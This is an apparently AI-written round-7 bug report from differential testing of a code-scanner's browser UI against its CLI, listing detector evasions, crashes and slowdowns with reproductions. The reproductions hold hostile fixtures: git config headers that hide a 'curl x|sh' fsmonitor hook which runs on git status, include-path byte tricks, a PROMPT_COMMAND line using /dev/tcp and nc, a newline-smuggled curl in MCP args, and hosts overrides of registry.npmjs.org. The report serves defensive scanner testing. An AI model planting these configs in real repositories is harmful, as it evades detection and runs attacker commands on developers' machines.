# Round 7: area "ui" (ZES 0.5.4 browser UI, /home/user/wt/zes-040 @ 045be3e)

`$W` = `/tmp/claude-0/-home-user/ddedecb1-31e9-5daf-bacd-4109257b812d/scratchpad/r7/ui-work`
Work copy: `$W/zes` (`npm ci`). `npm run build` gives the committed root `index.html` byte for byte (`cmp`), and verify-no-network passes.
Tools: git 2.43.0, jq 1.7, mawk 1.3.4, Chromium from /opt/pw-browsers (Noto Color Emoji installed), `LANG=C.UTF-8`.

## Harness (from r6, extended)
- `$W/hunt.sh` (`CASES=<dir> OUT=<file> $W/hunt.sh [only]`) runs `zes/ui/tests/unit/zz-hunt.test.ts`: the CLI with `--full --json` against
  `analyzeFiles()`. The loader now sets `head` (first 4096 bytes of `.git` / `commondir`, as `pointerHead`) and `blob` (files over 2 MiB),
  as `fileReader.ts` does. It also compares error reasons `duplicate_finding_id|git*|gitfile*|gitdir*`. `zz-hunt2.test.ts` is the same file with a 10 min timeout.
- `zz-gcfuzz.test.ts` + `$W/gccli.sh` (new): random Git config bytes go through ZES_GITCFG_AWK (LC_ALL=C), `gitConfigVars(TextDecoder(bytes))` and
  `git config -f F -z --list`. For a text git accepts, the UI list must equal git's list. Run: `cd $W/zes/ui && W=$W N=5000 SEED=n npx vitest run tests/unit/zz-gcfuzz.test.ts` → `$W/gcfuzz.out`.
- `zz-ljfuzz.test.ts` + `$W/ljcli.sh` (new): random JSON / JSONC / hook-shaped bytes go through ZES_JSONW_AWK and `lenientJson()`. The UI result is rebuilt into the awk records (O/L/K/C, pointer encoding) and compared exactly.
- `zz-eng.test.ts` (engine timing / errors per folder), `zz-perf7.test.ts` (reader timings on 2 and 16 MiB inputs), `zz-perf.test.ts` (r6 timings).
- `pw-r7.mjs` = r6 `pw-r6.mjs` plus `pageerror` / console errors and a timeout that still prints the status. `pw-prof.mjs` (CDP CPU profile, longest busy run).
  `pw-vs4.mjs` (DOM screenshot of every visiblePath candidate, with and without the invisible character, in `var(--font-mono)`).
- Case folders: `$W/c1` … `$W/c10`, `$W/perf7`.

---

## 1. Git config: a header with an empty section name (`[ "x"]`) makes both parsers drop the rest of the line. `[ "s"][core] fsmonitor = …` runs and is missed — **high**
Impact: a dropped repository whose `.git/config` runs a command on every `git status` gets no §26 CRITICAL in either the UI or the CLI. This is a new evasion in the round-6 parser.
git's `get_base_var` accepts an empty base name before whitespace and a quoted subsection. gitConfig.ts `header()` (and the awk `gc_sec`) return -1/0 when `q === p`, and the caller then skips the whole line.
```
printf '[ "s"][core] fsmonitor = "touch …/RAN1; false"\n' >> r1/.git/config     (real repo, $W/t/r1)
git config -f .git/config --list | tail -1  -> core.fsmonitor=touch …/RAN1; false
git status  -> RAN1 is created
$W/c1/a1/.git/config = '[ "s"][core] fsmonitor = "curl x|sh"\n'     (b1 = same without '[ "s"]')
hunt-c1.out:  === a1  (no row on either side)        === b1  both: CRITICAL §26 .git/config | - | s26.fsmonitor
browser a1:  "Scan complete", no finding rows;      browser b1: CRITICAL | b1/.git/config | core.fsmonitor runs an external command
```
The fuzzer finds the same class with a continuation: `[ "b"][core] fsmonitor = x\` + `path = x` gives git `core.fsmonitor=x path = x`, and the UI reports nothing (gcfuzz.3.out #001556).
Across 27,000 fuzz cases (6 seeds), every other UI-vs-git difference has a header with an empty base name (`[ "s"]`, `[\t"s"]`; git puts those keys under section "") or is the byte-split class in item 2.

## 2. Git config values are decoded before parsing, so a UTF-8 character split by `\`-newline or by quotes breaks include paths (UI only) — **medium**
Impact: the CRITICAL of an included config is missed in the UI, but the CLI and git read it. git and the awk work on bytes. The UI decodes first (TextDecoder → U+FFFD) and then joins.
```
a2/.git/config: '[include]\n\tpath = x\xc3\\\n\xa9.cfg\n'     a6/.git/config: '[include]\n\tpath = x\xc3""\xa9.cfg\n'
a2/.git/xé.cfg, a6/.git/xé.cfg: '[core]\n\tfsmonitor = "curl x|sh"\n'
git config -f .git/config --includes --list -> include.path=xé.cfg / core.fsmonitor=curl x|sh;  git status runs it ($W/t/r2: RAN2 created)
hunt-c1.out a2:  CLI only: CRITICAL §26 .git/xé.cfg | - | s26.fsmonitor {}        (a6: CLI finds it as well)
browser a2, a6:  "Scan complete", no finding rows, no "Git files outside" note
gcfuzz.1.out #002580: bytes 'c3 5c 0a bc' -> UI "\uFFFD\uFFFD", git/awk "ü"
```

## 3. Include path with a NUL: git and the CLI read up to the NUL, the UI keeps the NUL (UI only) — **low**
```
a3/.git/config: '[include]\n\tpath = y.cfg\0zz\n'   a3/.git/y.cfg: fsmonitor = "curl x|sh"
git config --includes --list -> core.fsmonitor=…;  git status runs it ($W/t/r3: RAN3)
hunt-c1.out a3:  CLI only: CRITICAL §26 .git/y.cfg | - | s26.fsmonitor {}      browser a3: no finding rows
```
The CLI splits the value at the NUL (`read -d ''`) and git reads a C string. `gitIncludes` gives `"y.cfg\0zz"`, which never resolves.

## 4. Crash: `push(...array)` with a large array aborts the whole UI scan (Maximum call stack size exceeded) — **medium**
Impact: one planted file of about 1 MB makes the browser scan fail with "Error". No finding is shown, including a CRITICAL elsewhere in the folder. The page fails loudly, so it is not shown as clean.
Three spread sites can be reached from file content:
```
index.ts:61          ctx.errors.push(...ctx.git.errors)      .git/config with 150,000 '[include]\npath=x' lines (1.05 MB) -> 150k git_include_unresolved
agentConfig.ts:68    e.lines.push(...`${cmd} ${args}`.split('\n'))   .claude/settings.json read leniently (has NaN), one hook command with 200,000 "\n" (600 KB)
skillpact.ts:407     toks.push(...cli)                        skill.contract.json whose capabilities[0].entry.cli has 200,001 elements (1 MB)   (also :409, :410)
engine (zz-eng.test.ts): q100000 -> 493 ms, errors=100000;  q150000, q300000, $W/c7/x1, x2 -> RangeError: Maximum call stack size exceeded
  ❯ hookEntries agentConfig.ts:68 / ❯ mustRefs skillpact.ts:407 / ❯ analyzeFiles index.ts:61
browser ($W/perf7/q150000, $W/c7/x1, $W/c7/x2; x1 and x2 also hold evil/.git/config with fsmonitor = "curl x|sh"):
  status "Error | Maximum call stack size exceeded", no finding rows, network: [] csp: []
```
CLI on the same include flood: 5,000 include lines already take 2 min (`$W/perf7/q5000`, one `resolve_path` per include). That is a CLI-side slowdown, noted for the CLI area.

## 5. Plain `s49.divergence.write` is never emitted by the UI — **medium**
Impact: a skill whose contract says `write: none` and whose script writes files gets MEDIUM `s49.divergence.write` from the CLI. In the UI it only shows in the SkillPact panel (rule 8 "hit") and never becomes a finding (export, counts, severity summary).
skillpact.ts:590: `k` is null for a non-durable write (and for a non-sensitive read), and then `continue`. The CLI maps it to `s49.divergence.write` / `.read` (zes-scan.sh:5314).
```
$W/c4/s3/w-tool: net-tool fixture contract with write/read "none", effects ["exec"]; scripts/thumb.py: with open(sys.argv[1], "w") as f: …
CLI: [... "s49.divergence.write"]      hunt-c4.out s3:  CLI only: MEDIUM §49 w-tool | skillpact-divergence | s49.divergence.write {}
UI (zz-sp.test.ts): observed ["write","exec"], divergence [{effect:"write",why:"none"}], results rule 8 "hit", findings: none from §49
```
Related, in the panel only: `ere()` keeps negated classes able to cross `\n` (`[^)]*` in `open\([^)]*['"][wax]`, `[^2&]>`), but the CLI greps line by line.
`$W/c4/s1` (`with open(\n    sys.argv[1], "w")`) gives UI observed write and CLI none. It becomes a finding mismatch once item 5 is fixed.

## 6. `.` in JS regexes still stops at CR / U+2028 / U+2029, but grep's `.` does not (lf() fixed only `^`/`$`) — **low**
Impact: CLI/UI level or finding mismatches on line-based checks, the class r6 #5 meant to remove. They are hunt-c2/c3:
```
p1-home/.bashrc "PROMPT_COMMAND='true'<U+2028>x=/dev/tcp/1.2.3.4/80"   CLI HIGH s33.prompt_command_suspicious / UI MEDIUM s33.prompt_command   (codeAndHost.ts:96 /PROMPT_COMMAND=.*(…)/)
p2-home/.bashrc "PROMPT_COMMAND=x\rnc 1.2.3.4 80"                         same mismatch
k1 workflow "key: x<U+2028>${{ github.event.pull_request.number }}"     CLI only: HIGH §21 s21.cache_pr_key       (ciAndExtensions.ts:229)
d1/Dockerfile "FROM php:8<U+2028>latest"                                  CLI MEDIUM s4.php_image_floating / UI INFO s4.php_image {"image":"php:8\u2028latest"}  (php.ts:120)
```
The §34 hosts check still uses `'im'` (network.ts:77) and `[ \t]` instead of `[[:space:]]`:
```
h1 hosts "1.2.3.4\vregistry.npmjs.org"          CLI only: HIGH §34 s34.hosts_override {"host":"registry.npmjs.org"}
h3 hosts "1.2.3.4\rregistry.npmjs.org"          CLI only: same
h2 hosts "1.2.3.4 registry.npmjs.org<U+2028>x"  UI  only: same    (the m flag puts $ before U+2028)
```
Other `m` flags left: intel.ts:125 (dpkg `field()`), skillpact.ts:451/457 (ere(..., 'm'); with the current patterns it changes no result).

## 7. Strict readers still differ outside the lenient §17 path (jq vs JSON.parse) — **low**
The 0.5.4 lenient reader runs only when a side's own strict reader fails. jq and JSON.parse fail on different files (jq: NaN/01 OK, lone surrogate and depth > 256 fail; JSON.parse: the reverse).
So the same document is judged by the strict rules on one side and by the lenient rules on the other.
```
§17 hook, command ["bash","-c","x"] (jq tostring -> no match; lenient "bash -c x" -> match):
  c6/j1 settings.json with "x":"\ud800"   CLI only: HIGH §17 s17.agent_hook        c6/j2 with "x":NaN   UI only: HIGH §17 s17.agent_hook
  c6/j4 .mcp.json with "\ud800"           CLI only: HIGH s17.dangerous_command      c6/j5 with NaN, args [["-c"],"x"]  UI only: HIGH s17.dangerous_command
  (c6/j3, same without the extra member: neither side)
§7 runOn split over two lines (raw view keeps the LF):
  c8/t1 tasks.json with NaN   CLI only: HIGH §7 s7.folder_open        c8/t2 with "\ud800"   UI only: HIGH §7 s7.folder_open      (t3: both)
§24/§42 manifest under Extensions/ (UI JSON.parse only, CLI jq only):
  c10/e1 "\ud800"   UI only: HIGH §24 s24.update_url              c10/e2 NaN   CLI only: HIGH §24 s24.update_url + HIGH §42 s42.known_name
```

## 8. MCP command lines are not split at LF in the UI (the CLI's mcpq does `split("\n")`) — **low**
```
c9/m1 .mcp.json {"command":"uv","args":["run","x\ncurl","https://e/x"]}   CLI only: HIGH §17 s17.dangerous_command
c9/m2 ... "x\nnpx","pkg"                                                    CLI only: MEDIUM §17 s17.npx
```
`riskOf()` tests HIGH_CMD / MED_CMD on the whole string. `(^|[\t\v\f\r "/])` does not match after `\n`, and `^` matches only at the start (no `m`). The hook path splits into lines, but the MCP path does not.

## 9. Git pointers: a `.git` / `commondir` over 2 MiB has no `head`, and `C:/…` counts as outside (UI only) — **low**
```
a4/sub/.git = "gitdir: ../gd\n" + 3,000,000 '#'   CLI only: HIGH §7 gd/hooks/post-checkout | s7.git_hook_suspicious
   browser: no rows, "Too large 1" (b4 = same with a short pointer: both, browser HIGH)
a5/sub/.git = "gitdir: C:/gd" (sub/C:/gd exists)  CLI only: HIGH §7 sub/C:/gd/hooks/post-checkout
   browser: "Git files outside the folder (CLI only) … C:/gd", although the directory is inside the folder (git on Linux/macOS treats it as relative)
```
pointer() returns null without `head`/text (fileReader keeps no head for files over 2 MiB), but git_read_pointer reads the first 4096 bytes. resolve() treats `^[A-Za-z]:[\\/]` as absolute.

## 10. Variation-selector / ZWJ rule: invisible characters left unmarked although Chromium draws them identically — **low**
DOM screenshots in `var(--font-mono)` of every candidate visiblePath leaves UNCHANGED (`pw-vs4.mjs`, 1554 strings, `$W/vs-dom.out`); these are PIXEL-IDENTICAL with and without the character:
```
FE0E (40): ⬜︎, the 26 regional indicators 🇦︎…🇿︎, skin tones 🏻︎…🏿︎, 👪︎, 🪉︎ 🪏︎ 🪾︎ 🫆︎ 🫜︎ 🫟︎ 🫩︎   (Emoji_Presentation, but no text glyph: still drawn as emoji)
FE0F (9):  ☝️ ⛹️ ✌️ ✍️ 🏋️ 🏌️ 🕴️ 🕵️ 🖐️   (text-default, but already drawn as emoji)
ZWJ: 120 / 120 tested pairs of emoji with no ZWJ sequence: "p😀<U+200D>🍎q" and "p😀🍎q" draw the same (also ⌚‍😀, 🇸‍🔥 …)
```
So two names that differ only by these characters are shown the same. The rule is right for ☕︎ ⚡︎ ⌚︎ 1︎ (they draw differently and FE0E after a digit is marked), but property-based "visible" is not the same as drawn-differently in Chromium.

## 11. Main-thread freezes on single adversarial files within the read limits — **low**
Chromium, max long task (`pw-r7.mjs`):
```
perf7/p2 .claude/settings.json 2 MiB, NaN (lenient path), 64 nested "args" around a 500k-element array: 4,915 ms (lenientJson pushes every scalar into up to 64 capture lists)
perf7/p3 same as .mcp.json: 2,594 ms        perf7/p4 .git/config 16 MiB, 1.4M "fsmonitor=x" lines: 4,253 ms
node (zz-perf7): gitConfigVars 1.2–2.3 s per 16 MiB shape, gitIncludes of 2.4M includes 3.8 s; lenientJson ≤ 1.3 s except the nested capture (4.3 s)
```
The CLI side is worse on the same reader. ZES_JSONW_AWK on the p2 file takes **7 min 26 s** (`$W/ljcli.sh` on `$W/ljp`). The CLI calls it when jq fails. For the same file with `"\ud800"` instead of NaN (`$W/perf7/p5`: JSON.parse OK, jq rc 5), the full CLI scan takes
**15 min 36 s** and ends with status `partial` and no §17 result (`$W/p5-cli.out`). The UI reads that file with JSON.parse and has no problem. This is a CLI-side hang, noted for the CLI area.

---

## Checked, no bug found
- **lenientJson vs ZES_JSONW_AWK:** 18,000 fuzz cases (seeds 1–4; 9,024 parsed by the UI) give **diff=0**, records and order exact. The cases cover comments, trailing commas, several documents, literals,
  surrogate escapes (pairs, lone, U+FFFD), control characters, BOM, invalid UTF-8, NUL, U+001F/U+0002 in names and commands, pointer encoding, entry detection, and "last member wins".
- **gitConfigVars vs ZES_GITCFG_AWK:** 27,000 cases (6 seeds), 6 differences. Every one is invalid UTF-8 rejoined by a continuation or by quotes (item 2), or an invalid-escape text git rejects anyway.
- **gitConfigVars vs git** (git-accepted texts only): equal except items 1 and 2.
- **16 MiB cap:** a 16,777,204-byte config is read whole from the Blob; `git_config_truncated` above the cap (r6 tests). Bytes, not UTF-16 units, are capped (`blob.slice(0, GIT_CONFIG_MAX)`).
- **lf():** escapes, classes (`[^]]`, `[]`), and `^`/`$` outside classes are converted correctly. The remaining `m` uses are listed in item 6.
- **Performance vs 0.5.4 claims:** engine (node) flat10k 577–597 ms (0.5.2: 521, 0.5.3: 1668), deep120 459–467 ms, deep (depth 400) 881–963 ms (0.5.3: 6955–7691). gitDiscover takes 20–51 ms.
  In Chromium the longest task on flat10k is still 3.4–3.9 s (0.5.3: 3.1–3.5 s). The CDP profile shows that run as "(program)" inside the input `change` dispatch (Chromium building the 10k FileList), not app code.
  App JS in that run is about 75 ms. deep120: 765–1091 ms.
- **Dedup:** the UI keeps the first spec per id and records `duplicate_finding_id` only for differing levels, as dedup_findings does. The shipped intel catalog has no (campaign, name) with two severities. See the fixture run below.
- **No network / CSP:** 0 requests that are not file/data/blob and no CSP console errors in every Playwright run (≈40 runs). CSP is `default-src 'none'; script-src 'sha256-kPuD…'; style-src 'sha256-s6/R…'; connect-src 'none'; …`.
  The script and style hashes recomputed from index.html match.
- **Fixture parity:** all 76 `tests/fixtures` (`$W/fx`, `$W/hunt-fx.out`). The only differences are documented CLI-only checks (§16 host versions, `s20.imperative_external`,
  symlink SymJack, HOME-only §18) and one harness artifact (litellm `package` "."). There are no `duplicate_finding_id` / Git error mismatches. `skillpact-README.md` is skipped (its CLI output is not JSON).
- **Not testable here:** folders with invalid-UTF-8 names (Playwright `setInputFiles` gives an empty FileList for them, so the browser side could not be measured).
